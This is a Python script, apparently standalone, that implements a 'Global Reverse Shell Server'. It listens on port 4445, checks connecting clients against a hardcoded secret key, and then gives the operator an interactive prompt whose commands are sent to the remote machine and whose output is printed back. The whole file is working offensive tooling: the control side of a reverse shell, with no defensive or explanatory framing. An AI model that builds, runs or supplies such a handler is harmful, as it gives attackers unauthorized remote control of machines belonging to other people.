#!/usr/bin/env python3
"""
Global Reverse Shell Server
Listens on a port and responds with secret key for client verification
"""

import socket
import threading
import sys

class GlobalReverseShellServer:
    def __init__(self, port, secret_key):
        self.port = port
        self.secret_key = secret_key
        self.clients = []
        
    def handle_client(self, client_socket, address):
        print(f"[+] New connection from {address[0]}:{address[1]}")
        
        try:
            # Wait for handshake
            data = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
            
            if data.startswith("HELLO:"):
                # Verification request
                key = data.split(":", 1)[1] if ":" in data else ""
                
                if key == self.secret_key:
                    # Correct key - send confirmation
                    client_socket.send(f"OK:{self.secret_key}\n".encode())
                    print(f"[✓] Client verified: {address[0]}")
                    client_socket.close()
                    return
                else:
                    print(f"[!] Wrong key from {address[0]}: {key}")
                    client_socket.close()
                    return
                    
            elif data.startswith("CONNECT:"):
                # Full connection
                key = data.split(":", 1)[1] if ":" in data else ""
                
                if key == self.secret_key:
                    print(f"[✓] Client connected: {address[0]}")
                    self.clients.append(client_socket)
                    
                    # Interactive shell
                    self.shell_loop(client_socket, address)
                else:
                    print(f"[!] Wrong key on connect from {address[0]}")
                    client_socket.close()
                    return
                    
        except Exception as e:
            print(f"[!] Error handling client {address[0]}: {e}")
        finally:
            if client_socket in self.clients:
                self.clients.remove(client_socket)
            client_socket.close()
            print(f"[-] Client disconnected: {address[0]}")
    
    def shell_loop(self, client_socket, address):
        """Interactive shell with connected client"""
        print(f"\n{'='*50}")
        print(f"  SHELL SESSION: {address[0]}:{address[1]}")
        print(f"{'='*50}")
        print("Type 'exit' to close connection")
        print(f"{'='*50}\n")
        
        while True:
            try:
                # Get command from user
                command = input(f"{address[0]}> ").strip()
                
                if command.lower() == 'exit':
                    print("[!] Closing connection...")
                    break
                
                if not command:
                    continue
                
                # Send command
                client_socket.send((command + "\n").encode())
                
                # Receive output
                output = client_socket.recv(8192).decode('utf-8', errors='ignore')
                print(output, end='')
                
            except KeyboardInterrupt:
                print("\n[!] Interrupted")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                break
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind(('0.0.0.0', self.port))
            server.listen(5)
            
            print("\n" + "="*50)
            print("  GLOBAL REVERSE SHELL SERVER")
            print("="*50)
            print(f"Listening on port: {self.port}")
            print(f"Secret key: {self.secret_key}")
            print(f"Waiting for clients...")
            print("="*50 + "\n")
            
            while True:
                client_socket, address = server.accept()
                
                # Handle each client in a separate thread
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                client_thread.start()
                
        except KeyboardInterrupt:
            print("\n[!] Server stopped")
        finally:
            server.close()

if __name__ == "__main__":
    port = 4445
    secret_key = "MySuperSecret123"
    
    if len(sys.argv) >= 2:
        port = int(sys.argv[1])
    if len(sys.argv) >= 3:
        secret_key = sys.argv[2]
    
    server = GlobalReverseShellServer(port, secret_key)
    server.start()